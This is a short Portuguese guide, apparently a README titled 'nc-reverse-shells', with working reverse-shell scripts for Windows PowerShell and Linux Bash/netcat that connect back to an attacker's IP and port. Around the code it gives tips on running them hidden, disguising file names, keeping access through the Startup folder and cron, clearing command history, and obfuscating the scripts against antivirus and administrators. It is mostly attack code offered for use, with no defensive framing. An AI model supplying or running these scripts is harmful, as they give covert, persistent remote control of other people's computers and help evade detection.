# nc-reverse-shells
1. Script PowerShell (Windows)

# Salvar como reverse_shell.ps1
# Script silencioso para conexão reversa

$ip = "192.168.15.25"   # Substitua pelo IP do atacante
$port = 3000            # Substitua pela porta usada pelo atacante

try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $buffer = New-Object System.Byte[] 1024

    while (($bytes = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytes)
        $output = (Invoke-Expression $cmd 2>&1 | Out-String)
        $prompt = "PS " + (Get-Location).Path + "> "
        $response = $output + $prompt
        $sendbyte = ([Text.Encoding]::ASCII).GetBytes($response)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
} catch {
    # Silenciosamente falha, sem erros visíveis ao usuário
    Start-Sleep -Seconds 10
}

Como torná-lo mais silencioso:

    Esconda a execução:
        Execute o script com:

        powershell -WindowStyle Hidden -File reverse_shell.ps1

    Persistência (opcional):
        Coloque o script em um local menos visível (ex.: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup).

2. Script Bash (Linux)

#!/bin/bash
# Salvar como reverse_shell.sh
# Script silencioso para conexão reversa

IP="192.168.15.25"   # Substitua pelo IP do atacante
PORT=3000            # Substitua pela porta usada pelo atacante

# Criação de conexão reversa silenciosa
mkfifo /tmp/.hidden_pipe
cat /tmp/.hidden_pipe | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/.hidden_pipe &
rm -f /tmp/.hidden_pipe  # Remove o pipe após a execução

Como torná-lo mais silencioso:

    Esconda o script:
        Coloque o arquivo em um local menos óbvio, como ~/.cache/ ou /tmp/.hidden/.
        Nomeie-o de forma inofensiva (ex.: .system_update.sh).

    Execução silenciosa:
        Execute o script com:

    nohup ./reverse_shell.sh > /dev/null 2>&1 &

Persistência (opcional):

    Adicione o script ao cron ou rc.local:

        (crontab -l 2>/dev/null; echo "@reboot /caminho/para/reverse_shell.sh") | crontab -

Cuidados Adicionais

    Minimize rastros: Limpe logs e histórico de comandos após a execução.
        Linux:

history -c && unset HISTFILE

Windows: Use PowerShell para limpar o histórico do terminal:

    Clear-History

Obfusque os scripts: Use ferramentas de compactação ou codificação para dificultar sua identificação por antivírus ou administradores.
